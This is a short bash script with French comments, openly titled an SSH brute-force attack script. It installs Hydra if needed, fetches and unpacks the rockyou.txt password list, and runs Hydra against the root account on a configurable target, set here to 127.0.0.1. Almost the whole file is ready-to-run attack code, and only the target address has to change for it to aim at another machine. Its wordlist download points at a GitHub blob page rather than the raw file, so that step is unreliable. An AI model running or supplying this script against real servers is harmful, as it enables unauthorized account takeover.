#!/bin/bash 

# Script d'attaque - Brute Force sur SSH
echo "Lancement de l'attaque brute force sur SSH..."

# Vérifier si Hydra est installé
if ! command -v hydra &> /dev/null; then
    echo "Hydra non trouvé. Installation en cours..."
    apt update && apt install -y hydra || { echo "Échec de l'installation d'Hydra. Abandon."; exit 1; }
fi

# Définir les variables
TARGET="127.0.0.1" # Adresse IP de la machine cible
PORT="22"          # Port SSH
USER="root"        # Utilisateur à attaquer
WORDLIST="/usr/share/wordlists/rockyou.txt" # Liste de mots de passe

# Vérifier la présence de rockyou.txt
if [ ! -f "$WORDLIST" ]; then
    echo "Fichier rockyou.txt introuvable. Téléchargement et préparation en cours..."
    
    # Vérifier si le dossier de wordlists existe
    if [ ! -d "/usr/share/wordlists" ]; then
        mkdir -p /usr/share/wordlists || { echo "Impossible de créer le répertoire /usr/share/wordlists. Abandon."; exit 1; }
    fi

    # Télécharger le fichier rockyou.txt.gz si le package wordlists n'est pas disponible
    apt update && apt install -y wordlists || {
        echo "Le package 'wordlists' n'est pas disponible. Téléchargement manuel de rockyou.txt.gz..."
        wget -O /usr/share/wordlists/rockyou.txt.gz "https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz" || {
            echo "Téléchargement de rockyou.txt.gz échoué. Abandon.";
            exit 1;
        }
    }

    # Décompresser rockyou.txt.gz
    if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
        gunzip /usr/share/wordlists/rockyou.txt.gz || { echo "Échec de la décompression de rockyou.txt.gz. Abandon."; exit 1; }
    fi

    # Vérifier si le fichier a été correctement préparé
    if [ -f "$WORDLIST" ]; then
        echo "Fichier rockyou.txt préparé avec succès."
    else
        echo "Erreur lors de la préparation de rockyou.txt. Abandon."
        exit 1
    fi
else
    echo "Fichier rockyou.txt déjà présent."
fi

# Lancer l'attaque brute force
echo "Début de l'attaque brute force avec Hydra..."
hydra -l $USER -P $WORDLIST ssh://$TARGET -s $PORT -t 4 || { echo "Erreur lors de l'exécution de Hydra. Abandon."; exit 1; }

echo "Attaque brute force terminée."
